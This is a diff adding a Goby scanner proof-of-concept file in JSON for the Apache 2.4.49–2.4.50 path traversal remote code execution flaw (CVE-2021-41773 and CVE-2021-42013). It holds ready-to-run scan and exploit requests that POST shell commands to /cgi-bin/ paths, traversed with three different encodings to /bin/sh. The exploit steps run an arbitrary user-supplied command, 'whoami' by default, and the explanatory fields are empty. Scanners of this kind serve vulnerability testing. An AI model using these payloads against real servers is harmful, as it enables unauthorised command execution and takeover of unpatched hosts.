@@ -1,0 +1,247 @@
+{
+      "Name": "Apache 2.4.49 RCE (CVE-2021-41773) and 2.4.50 (CVE-2021-42013)",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "product=\"Apache-Web-Server\"",
+      "Description": "",
+      "Product": "Apache/2.4.49-2.4.50",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Cmd",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;echo {{{r1}}}",
+                        "set_variable": [
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{r1}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;echo {{{r1}}}",
+                        "set_variable": [
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{r1}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;echo {{{r1}}}",
+                        "set_variable": [
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{r1}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;{{{Cmd}}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{Cmd}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;{{{Cmd}}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{Cmd}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "echo;{{{Cmd}}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{Cmd}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-12 16:06:51",
+      "GobyVersion": "1.8.301"
+}
